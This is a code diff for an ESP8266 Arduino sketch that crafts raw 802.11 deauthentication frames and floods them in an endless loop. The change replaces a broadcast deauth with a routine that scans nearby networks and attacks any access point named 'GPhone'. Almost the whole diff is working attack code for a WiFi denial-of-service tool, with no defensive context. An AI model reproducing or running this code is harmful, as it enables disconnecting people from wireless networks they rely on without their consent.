@@ -10,31 +10,28 @@ extern "C" {
   #include "espconn.h"
 }
 
+#define NUMNET 30
+
+uint8_t numNetworks = 0;
+String knownMACS[NUMNET];
+
 void setup() {
-  Serial.begin(115200);
+  Serial.begin(9600);
   Serial.println();
-  Serial.println("Deauthing...");
+  Serial.println("Deauthing GPhone");
 
   // Set WiFi to station mode and disconnect from any AP
   WiFi.mode(WIFI_STA);
   WiFi.disconnect();
   delay(100);
-
-  WiFi.begin(HOST_SSID, HOST_PASSWORD);
-  while (WiFi.status() != WL_CONNECTED){
-    Serial.println(".");
-    delay(1000);
-  }
-
-  // Broadcast deauth packets
-  deauthAttack("FF:FF:FF:FF:FF:FF");  // FF:FF:FF:FF:FF:FF is the broadcast address
 }
 
 void loop() {
-  // Do nothing here
+  findNewNetworks();
+  delay(5000);
 }
 
-void deauthAttack(const char* ap) {
+void deauthAttack(char* ap) {
   uint8_t packet[26] = {
     0xC0, 0x00, // Frame Control
     0x3A, 0x01, // Duration
@@ -55,5 +52,28 @@ void deauthAttack(const char* ap) {
   while (true) {
     wifi_send_pkt_freedom(packet, 26, 0);
     delay(1);
+  }
+}
+
+void findNewNetworks(){
+  uint8_t newNumNetworks = WiFi.scanNetworks();
+
+  for (uint8_t i = 0; i < newNumNetworks; i++){
+    String newMAC = WiFi.BSSIDstr(i);
+    bool newNetwork = true;
+
+    for (uint8_t k = 0; k < numNetworks; k++){
+      if(newMAC == knownMACS[k]){
+        newNetwork = false;
+        break;
+      }
+    }
+
+    if(newNetwork){
+      String ssid = WiFi.SSID(i);
+      if(ssid == "GPhone"){
+        deauthAttack(&(WiFi.BSSIDstr(i))[0]);
+      }
+    }
   }
 }
